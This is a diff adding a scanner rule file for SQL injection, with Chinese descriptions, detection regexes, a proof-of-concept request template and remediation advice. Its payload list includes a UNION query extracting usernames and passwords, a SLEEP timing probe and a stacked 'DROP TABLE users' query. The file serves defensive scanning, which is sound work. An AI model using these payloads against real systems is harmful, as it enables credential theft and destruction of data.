@@ -1,0 +1,120 @@
+id: "rule-injection-sqli"
+name: "SQL Injection"
+name_cn: "SQL 注入"
+description: "用户可控输入未经过滤直接拼接到 SQL 查询，导致攻击者可以执行任意 SQL 语句，读取/篡改数据库数据"
+
+owasp_category: "A03-injection"
+owasp_subcategory: "SQL Injection"
+cwe_id: "CWE-89"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  base_score: 9.8
+  severity: "critical"
+
+detection:
+  methods: ["DAST", "SAST"]
+  dast_signals:
+    high_specificity:
+      - type: "error_message"
+        pattern: "SQL syntax.*MySQL|Warning.*pg_query|ORA-\\d{5}|SQLite/JDBCDriver|Microsoft SQL Server|ODBC.*SQL Server|You have an error in your SQL syntax"
+        confidence: 0.95
+      - type: "boolean_differential"
+        pattern: "(1=1|OR 1=1|1'='1).*(1=2|OR 1=2|1'='2)"
+        confidence: 0.90
+    medium_specificity:
+      - type: "response_time"
+        pattern: "sleep\\([5-9]|benchmark\\("
+        confidence: 0.75
+      - type: "content_diff"
+        pattern: "baseline_vs_probe_difference"
+        confidence: 0.70
+    low_specificity:
+      - type: "url_parameter"
+        pattern: "(id|cat|query|keyword|search|sort|order|filter|type|page|status)="
+        confidence: 0.30
+  sast_patterns:
+    - language: "go"
+      pattern: "db\\.Query\\([^)]*\\+|fmt\\.Sprintf.*SELECT.*%s|fmt\\.Sprintf.*INSERT.*%s"
+      confidence: 0.80
+    - language: "python"
+      pattern: "cursor\\.execute\\([^)]*\\+|f['\"].*SELECT.*\\{|execute\\(.*%.*\\)"
+      confidence: 0.80
+    - language: "java"
+      pattern: "executeQuery\\([^)]*\\+|createQuery\\([^)]*\\+|Statement\\.execute"
+      confidence: 0.80
+    - language: "php"
+      pattern: "mysql_query\\([^)]*\\.\\$|\\$pdo->query\\([^)]*\\.\\$"
+      confidence: 0.80
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "status_code"
+      condition: "status_code != 200"
+      action: "discard"
+    - filter: "content_validation"
+      condition: "no_sql_error_or_boolean_diff_in_response"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    GET {{url}}?{{param}}={{payload}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  payloads:
+    - name: "error_based_basic"
+      value: "'"
+      description: "单引号测试是否触发 SQL 错误"
+      risk: "low"
+    - name: "boolean_true"
+      value: "' OR '1'='1"
+      description: "布尔盲注真条件"
+      risk: "low"
+    - name: "boolean_false"
+      value: "' AND '1'='2"
+      description: "布尔盲注假条件"
+      risk: "low"
+    - name: "union_extract"
+      value: "' UNION SELECT NULL,username,password FROM users--"
+      description: "UNION 注入提取用户凭据"
+      risk: "high"
+    - name: "time_based_mysql"
+      value: "' AND SLEEP(5)--"
+      description: "MySQL 时间盲注"
+      risk: "medium"
+    - name: "stacked_queries"
+      value: "'; DROP TABLE users--"
+      description: "堆叠查询（仅测试不执行破坏性操作）"
+      risk: "critical"
+  verification:
+    - type: "response_diff"
+      description: "对比基线与 payload 响应的内容差异和耗时差异"
+    - type: "error_match"
+      pattern: "SQL syntax|MySQL|PostgreSQL|ORA-"
+      description: "响应中出现数据库错误信息"
+    - type: "boolean_diff"
+      description: "TRUE 条件返回数据，FALSE 条件返回空/不同数据"
+
+remediation:
+  priority: "P0"
+  summary: "使用参数化查询，禁止拼接 SQL 语句"
+  details:
+    - "所有数据库查询使用参数化绑定（PreparedStatement / $1, $2 / ? 占位符）"
+    - "对输入参数做白名单校验，禁止直接拼接到 SQL"
+    - "使用 ORM 框架的安全 API，避免原生 SQL 拼接"
+    - "最小权限原则：数据库账号只授予必要权限"
+    - "启用 WAF 作为纵深防御"
+  references:
+    - "https://owasp.org/Top10/A03_2021-Injection/"
+    - "https://cwe.mitre.org/data/definitions/89.html"
+
+knowledge_source:
+  file: "知识库/injection-test.md"
+  methodology: "src-value-hunting.md §3 注入探针矩阵：基线→探针→差分"
